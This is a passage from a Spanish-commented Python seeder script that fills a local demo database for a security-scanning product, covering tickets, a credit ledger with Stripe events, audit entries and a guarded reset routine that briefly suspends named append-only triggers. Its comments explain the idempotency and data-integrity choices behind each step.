    pasarlo a mano haría que dos ejecuciones del seeder volcaran el mismo número y el `UNIQUE`
    reventara en la segunda. Dejarlo al `server_default` es además lo que garantiza que el
    número que ve el usuario en el panel es el que le corresponde en la numeración global.
    """

    emisores = {
        "admin": demo.admin_id,
        "soc": demo.soc_id,
        "investigador": demo.investigador_id,
    }

    for entrada in demo.tickets:
        ticket = await _uno_o_crear(
            session,
            SupportTicket,
            {"subject": entrada["subject"]},
            {
                "id": demo.ticket_id(entrada["clave"]),
                "organization_id": demo.org_id,
                "created_by_user_id": emisores[entrada["creator"]],
                "category": entrada["category"],
                "priority": entrada["priority"],
                "status": entrada["status"],
                "assigned_to_user_id": (
                    emisores[entrada["assigned"]] if entrada["assigned"] else None
                ),
                "created_at": entrada["created"],
            },
        )
        for indice, mensaje in enumerate(entrada["messages"]):
            # El criterio de busqueda es el **id estable**, no `created_at`.
            #
            # Buscar por la marca de tiempo parecia equivalente y no lo es. PostgreSQL guarda
            # `timestamptz` normalizado a UTC, asi que al releer una fila llega con un `tzinfo`
            # distinto del que traia el diccionario de la semilla, y la igualdad falla. La fila
            # no se encuentra, se inserta otra vez con el mismo id, y la segunda ejecucion del
            # se rompe con una violacion de clave primaria.
            #
            # El id estable es justo lo que existe para esto: es determinista, es un
            # `uuid.UUID` de Python en los dos lados, y no depende de como el servidor normalice
            # una fecha. El sintoma —"la idempotencia funciona para todo menos los mensajes"— es
            # el que hace que esto parezca un caso raro cuando en realidad es la eleccion de clave
            # equivocada.
            await _uno_o_crear(
                session,
                TicketMessage,
                {"id": id_estable("message", ORG_SLUG, entrada["clave"], str(indice))},
                {
                    "ticket_id": ticket.id,
                    "created_at": mensaje["at"],
                    "sender_user_id": emisores[mensaje["sender"]],
                    "is_admin_reply": mensaje["is_admin"],
                    "content": mensaje["content"],
                },
            )
    await session.commit()


async def sembrar_facturacion(session: AsyncSession, demo: Demo) -> None:
    """Seis movimientos con su asiento de Stripe cuando corresponde.

    ## Por qué `balance_after` se encadena y no se calcula en reverse

    Porque la tabla es **append-only** con un trigger que bloquea `UPDATE` y `DELETE`: si el
    valor inicial quedara mal, no habría forma de corregirlo después. La única forma segura de
    acertar es leer el saldo real, aplicarle los movimientos **en orden cronológico** y
    escribir el resultado de cada paso en el momento de insertarlo.

    ## Por qué el saldo de la organización se fija al final

    Porque `credit_ledger` es la fuente de verdad del saldo y `organizations.credit_balance` es
    su copia materializada. Si los insertos se hicieran y luego se actualizara la organización
    con un total calculado aparte, cualquier fallo intermedio dejaría los dos números
    discrepando **sin ninguna restricción que lo impida**: por eso se escribe una sola vez, al
    final, con el valor que resulta de encadenar.
    """

    organizacion = (
        await session.execute(
            select(Organization).where(Organization.id == demo.org_id)
        )
    ).scalar_one()

    for movimiento in demo.movimientos:
        if movimiento.get("stripe"):
            await _uno_o_crear(
                session,
                StripeEvent,
                {"event_id": movimiento["stripe"]["event_id"]},
                {
                    "id": id_estable("stripe", ORG_SLUG, movimiento["clave"]),
                    "event_type": movimiento["stripe"]["type"],
                    "organization_id": demo.org_id,
                    "session_id": f"cs_demo_{movimiento['clave']}"[:128],
                    "credits_granted": movimiento["stripe"]["credits"],
                    "amount_cents": movimiento["stripe"]["cents"],
                },
            )

    # El orden es por fecha, no por el orden del catálogo. Encadenar en el orden del
    # catálogo produciría saldos intermedios imposibles —un consumo antes de la compra que lo
    # financia— y el extracto sería ilegible.
    saldo = Decimal(organizacion.credit_balance)
    for movimiento in sorted(demo.movimientos, key=lambda m: m["at"]):
        ya_existe = (
            await session.execute(
                select(CreditLedger.id).where(
                    CreditLedger.organization_id == demo.org_id,
                    CreditLedger.reference_id == movimiento["ref"],
                )
            )
        ).scalar_one_or_none()
        if ya_existe is not None:
            # El asiento ya está. Se recalcula el saldo desde los **datos** que hay en la
            # tabla, no desde el catálogo, para que una ejecución repetida sea una no-op real
            # y no un doble conteo.
            saldo = await _saldo_real(session, demo.org_id)
            continue
        saldo += movimiento["delta"]
        session.add(
            CreditLedger(
                id=id_estable("ledger", ORG_SLUG, movimiento["clave"]),
                organization_id=demo.org_id,
                amount_delta=movimiento["delta"],
                balance_after=saldo.quantize(Decimal("0.0000")),
                reason=movimiento["reason"],
                reference_id=movimiento["ref"],
                created_at=movimiento["at"],
            )
        )
    await session.flush()

    saldo_final = await _saldo_real(session, demo.org_id)
    organizacion.credit_balance = saldo_final
    await session.commit()
    logger.info("  Saldo final del ledger: %s créditos", saldo_final)


async def _saldo_real(session: AsyncSession, organization_id: uuid.UUID) -> Decimal:
    """La suma de `amount_delta` de los asientos existentes.

    Es la misma fórmula que usa el producto para calcular el saldo disponible, y se usa aquí
    por el mismo motivo: leer el saldo de la organización y confiar en él sería confiar en una
    copia que puede haber quedado desfasada.
    """

    total = (
        await session.execute(
            select(func.coalesce(func.sum(CreditLedger.amount_delta), 0)).where(
                CreditLedger.organization_id == organization_id
            )
        )
    ).scalar_one()
    return Decimal(total).quantize(Decimal("0.0000"))


async def sembrar_auditoria(session: AsyncSession, demo: Demo) -> None:
    """Asientos de `audit_log` con las cinco acciones que el enum admite.

    No se inventan acciones que el dominio no reconoce: `AuditActionEnum` solo tiene cinco
    valores, y escribir un sexto en la base produciría una fila que ninguna consulta del
    panel sabe pintar. Los cinco se siembran porque los cinco aparecen en el panel.
    """

    repos = await _uno_o_crear(
        session,
        Repository,
        {"full_name": "acme/core-api"},
        {
            "id": demo.repos["acme/core-api"],
            "organization_id": demo.org_id,
            "provider": GitProviderEnum.GITHUB,
            "remote_repo_id": "acme:core-api",
            "name": "core-api",
            "clone_url": "https://github.com/acme/core-api.git",
            "default_branch": "main",
            "pr_reviews_enabled": True,
            "webhook_secret": hash_password("webhook-acme/core-api"),
            "is_active": True,
        },
    )
    await session.commit()

    critico = (
        await session.execute(
            select(Vulnerability).where(
                Vulnerability.id == demo.vuln_id("sqli-login")
            )
        )
    ).scalar_one()

    asientos: list[tuple[AuditActionEnum, str, uuid.UUID, dict[str, str]]] = [
        (
            AuditActionEnum.REPOSITORY_CONNECTED,
            "repository",
            repos.id,
            {"name": "acme/core-api", "provider": "GITHUB"},
        ),
        (
            AuditActionEnum.REPOSITORY_POLICY_UPDATED,
            "repository",
            repos.id,
            {"pr_reviews_enabled": "true"},
        ),
        (
            AuditActionEnum.REPOSITORY_CONNECTED,
            "repository",
            repos.id,
            {"name": "acme/web-portal", "provider": "GITLAB"},
        ),
        (
            AuditActionEnum.STATUS_CHANGED,
            "vulnerability",
            critico.id,
            {"from": "OPEN", "to": "IN_PROGRESS"},
        ),
        (
            AuditActionEnum.STATUS_CHANGED,
            "vulnerability",
            critico.id,
            {"from": "IN_PROGRESS", "to": "REMEDIATION_PROPOSED"},
        ),
        (
            AuditActionEnum.REPOSITORY_DISCONNECTED,
            "repository",
            repos.id,
            {"name": "acme/legacy-billing", "provider": "GITHUB"},
        ),
    ]

    for indice, (accion, tipo_entidad, entidad_id, extra) in enumerate(asientos):
        desde = extra.get("from")
        hacia = extra.get("to")
        # El criterio es el **id estable** y no la marca de tiempo.
        #
        # Aqui el fallo era peor que en los mensajes de ticket: `hace()` es **relativo al
        # momento de la ejecucion**, asi que la segunda vez que corre el seeder produce una
        # fecha distinta aunque el script no haya cambiado. Buscar por ella no falla "a veces":
        # falla siempre, y la segunda ejecucion muere con una violacion de clave primaria de
        # `audit_log`.
        #
        # Y no se puede arreglar poniendo la fecha en un valor fijo sin mas, porque el rastro es
        # `append-only` por trigger de R4: `_uno_o_crear` no podria ni corregir la fila si la
        # encontrara. La clave estable es lo unico que decide de forma fiable si el asiento ya
        # esta sembrado.
        await _uno_o_crear(
            session,
            AuditLogEntry,
            {"id": id_estable("audit", ORG_SLUG, str(indice))},
            {
                "organization_id": demo.org_id,
                "entity_id": entidad_id,
                "action": accion,
                "created_at": hace(days=40, hours=40 - indice * 6),
                "actor_user_id": (
                    demo.admin_id if indice % 2 == 0 else demo.soc_id
                ),
                "entity_type": tipo_entidad,
                "from_state": desde,
                "to_state": hacia,
            },
        )
    await session.commit()


#: Los triggers que impiden borrar. Se enumeran **uno a uno** en vez de desactivar todos los
#: de las tablas tocadas, porque un `DISABLE TRIGGER ALL` desactivaría también los que
#: protegen datos de otros clientes y el script volvería a dejar la base menos protegida de lo
#: que estaba, incluso en desarrollo.
#:
#: Y se reponen en la misma transacción en la que se desactivan: si el borrado falla a mitad,
#: la transacción se revierte entera y los triggers vuelven con ella. No queda una ventana en la
#: que la base esté desprotegida.
TRIGGERS_A_SUSPENDER: Final[tuple[tuple[str, str], ...]] = (
    ("vulnerabilities", "trg_protect_vulnerability_evidence"),
    ("vulnerabilities", "trg_protect_vulnerability_evidence_truncate"),
    ("credit_ledger", "trg_protect_credit_ledger_append_only"),
    ("audit_log", "trg_protect_audit_log_append_only"),
)


class ResetNoPermitidoError(RuntimeError):
    """Se pidió `--reset` contra un entorno donde no se puede."""


async def limpiar(session: AsyncSession, demo: Demo) -> None:
    """Borra únicamente lo que creó este script.

    ## Por qué hay que desactivar triggers, y por qué el script no lo hace «a lo bruto»

    `vulnerabilities`, `credit_ledger` y `audit_log` son **append-only por diseño** (R4): sus
    triggers bloquean `UPDATE` y `DELETE` porque son registro forense y contable. Un borrado
    directo no falla con un error de permisos sino con una excepción de PostgreSQL, y el
    script muere después de haber borrado la mitad.

    Es la respuesta correcta de la base: esos datos no se borran. Aquí es la única excepción
    deliberada, y por eso está **acotada por tres cosas**:

    1. Solo se ejecuta con `--reset`, nunca en un siembra normal.
    2. Se niega en `staging` y `production`. Una herramienta de desarrollo local no puede
       tener una vía para vaciar el libro contable de un entorno real, por improbable que sea
       que alguien laEjecute allí por error.
    3. Los triggers se desactivan **nombrados** y se reponen en la misma transacción. No hay
       ventana sin protección y no se toca ningún trigger ajeno.

    ## Por qué el borrado va por identificador determinista y no por «lo de la demo»

    Porque un criterio laxo —`email LIKE 'demo.%'`, `name LIKE '%Acme%'`— puede alcanzar una fila
    que no es de este script. Los identificadores los calcula la misma función que los generó,
    así que la condición y la inserción no pueden separarse.
    """

    from backend.core.config import settings

    if settings.environment in {"staging", "production"}:
        raise ResetNoPermitidoError(
            f"--reset está prohibido en {settings.environment}: las tablas de evidencia son "
            "append-only por diseño y esta herramienta solo existe para desarrollo local."
        )

    logger.warning("Borrando los datos de la demo por sus identificadores deterministas")
    for tabla, trigger in TRIGGERS_A_SUSPENDER:
        await session.execute(
            text(f"ALTER TABLE {tabla} DISABLE TRIGGER {trigger}")
        )

    try:
        # El orden es el inverso al de las claves foráneas: hijos antes que padres, o la base
        # rechaza el borrado y el script muere sin haber limpiado nada.
        for entrada in demo.tickets:
            await session.execute(
                delete(TicketMessage).where(
                    TicketMessage.ticket_id == demo.ticket_id(entrada["clave"])
                )
            )
        await session.execute(
            delete(SupportTicket).where(SupportTicket.organization_id == demo.org_id)
        )
        await session.execute(
            delete(DiscoveredAsset).where(DiscoveredAsset.organization_id == demo.org_id)
        )
        await session.execute(
            delete(VerifiedDomain).where(VerifiedDomain.organization_id == demo.org_id)
        )
        await session.execute(
            delete(Vulnerability).where(Vulnerability.organization_id == demo.org_id)
        )
        await session.execute(
            delete(PullRequestReview).where(
                PullRequestReview.organization_id == demo.org_id
            )
        )
        await session.execute(
            delete(PentestRun).where(PentestRun.organization_id == demo.org_id)
        )
        await session.execute(
            delete(Repository).where(Repository.organization_id == demo.org_id)
        )
        await session.execute(
            delete(AuditLogEntry).where(AuditLogEntry.organization_id == demo.org_id)
        )
        await session.execute(
            delete(StripeEvent).where(StripeEvent.organization_id == demo.org_id)
        )
        await session.execute(
            delete(CreditLedger).where(CreditLedger.organization_id == demo.org_id)
        )
        await session.execute(
            delete(Membership).where(Membership.organization_id == demo.org_id)
        )
        await session.execute(delete(User).where(User.email.like(f"{PREFIJO}.%")))
        await session.execute(
            delete(Organization).where(Organization.id == demo.org_id)
        )
    finally:
        # En el `finally` y no al final del `try`: si un borrado falla, la transacción se
        # revierte y **los `DISABLE TRIGGER` también**, porque son parte de ella. Re-enabling
        # aquí es una red de seguridad para el caso de que alguien añada un `commit` en medio.
        for tabla, trigger in TRIGGERS_A_SUSPENDER:
            await session.execute(
                text(f"ALTER TABLE {tabla} ENABLE TRIGGER {trigger}")
            )
    await session.commit()


# --------------------------------------------------------------------------- #
# Punto de entrada
# --------------------------------------------------------------------------- #


async def main(argumentos: argparse.Namespace) -> int:
    """Ejecuta la accion pedida. Devuelve el codigo de salida del proceso.

    Las tres acciones —sembrar, limpiar-sembrar y solo limpiar— viven en **una** sesion y en
    **un** sitio. La version anterior abria una sesion para limpiar y otra para sembrar, con
    un parametro que se recibia y se descartaba; dos caminos para la misma operacion es
    exactamente donde dos implementaciones dejan de coincidir sin que nada falle.
    """

    logging.basicConfig(level=logging.INFO, format="%(message)s")
    demo = Demo()

    async with AsyncSessionLocal() as session:
        if argumentos.estado:
            return await _estado(session, demo)

        if argumentos.clear or argumentos.reset:
            await limpiar(session, demo)
            if argumentos.clear:
                logger.info("Datos de la demo eliminados. No se ha sembrado nada.")
                return 0

        logger.info("Sembrando el workspace de demostración: %s", ORG_NAME)
        logger.info("  Contraseña de las cuentas: %s", CONTRASENA_DEMO)
        logger.info("  Admin: %s.admin@acmesecurity.io", PREFIJO)

        await sembrar_tenant(session, demo)
        logger.info("  Tenant, 3 usuarios y 3 membresías")

        repositorios = await sembrar_repositorios(session, demo)
        logger.info("  3 repositorios (2 en GitHub, 1 en GitLab)")

        runs = await sembrar_escaneos(session, demo)
        logger.info("  3 escaneos: uno completo, uno en curso, uno fallido")

        await sembrar_revisiones(session, demo, repositorios)
        logger.info("  4 revisiones de pull request")

        await sembrar_hallazgos(session, demo, runs)
        logger.info("  5 hallazgos, uno por severidad")

        await sembrar_superficie(session, demo)
        logger.info("  2 dominios (1 verificado) y 8 activos descubiertos")

        await sembrar_tickets(session, demo)
        logger.info("  4 tickets de soporte con su hilo de mensajes")

        await sembrar_facturacion(session, demo)
        logger.info("  6 movimientos de crédito con sus eventos de Stripe")

        await sembrar_auditoria(session, demo)
        logger.info("  6 asientos de auditoría")

    logger.info("Listo. Entra con %s.admin@acmesecurity.io", PREFIJO)
    return 0


def parsear_argumentos() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Puebla la base local con un workspace de demostración.",
    )
    grupo = parser.add_mutually_exclusive_group()
    grupo.add_argument(
        "--reset",
        action="store_true",
        help=(
            "Borra lo que creó una ejecución anterior de este script y vuelve a sembrarlo. "
            "No toca ninguna fila que no sea suya."
        ),
    )
    grupo.add_argument(
        "--clear",
        action="store_true",
        help=(
            "Borra lo que creó este script y NO vuelve a sembrar. Es la operación que hay "
            "que hacer antes de lanzar la suite de tests: comparten base de datos, y unas "
            "pruebas que cuentan revisiones o repositorios ven los activos de la demo como "
            "filas de más."
        ),
    )
    grupo.add_argument(
        "--estado",
        action="store_true",
        help=(
            "Informa de si hay datos de demo sin tocar nada. Sale con 0 siempre, porque "
            "informar del estado no es una operación fallida."
        ),
    )
    return parser.parse_args()


async def _estado(session: AsyncSession, demo: Demo) -> int:
    """Informa de si hay datos de demo, sin tocar nada.

    Existe para que `ci_check.py` pueda avisar **antes** de lanzar los gates, no después. La
    suite de tests y este seeder comparten la base de datos, y hay pruebas que cuentan
    revisiones y repositorios: con la demo sembrada ven filas de más y fallan. Descubrirlo en
    el resumen —con siete pruebas en rojo y un nombre de repositorio de otra organización—
    cuesta mucho más que leer un aviso previo.

    Sale siempre con 0: informar del estado no es una operación fallida, y un código distinto
    haría que quien lo encadena a un script lo tomara por un error.
    """

    activos = int(
        (
            await session.execute(
                select(func.count(DiscoveredAsset.id)).where(
                    DiscoveredAsset.organization_id == demo.org_id
                )
            )
        ).scalar_one()
    )
    hallazgos = int(
        (
            await session.execute(
                select(func.count(Vulnerability.id)).where(
                    Vulnerability.organization_id == demo.org_id
                )
            )
        ).scalar_one()
    )
    if activos == 0 and hallazgos == 0:
        print("limpio")
    else:
        print(f"demo:{activos} activos, {hallazgos} hallazgos")
    return 0


if __name__ == "__main__":
    # `main` es asíncrona y `asyncio.run` es lo que la ejecuta de verdad. Pasarle la
    # corrutina a `sys.exit` creaba un objeto y salía sin sembrar nada, sin error: el proceso
    # terminaba con 0 y una base vacía, que es la forma más difícil de fallar.
    sys.exit(asyncio.run(main(parsear_argumentos())))
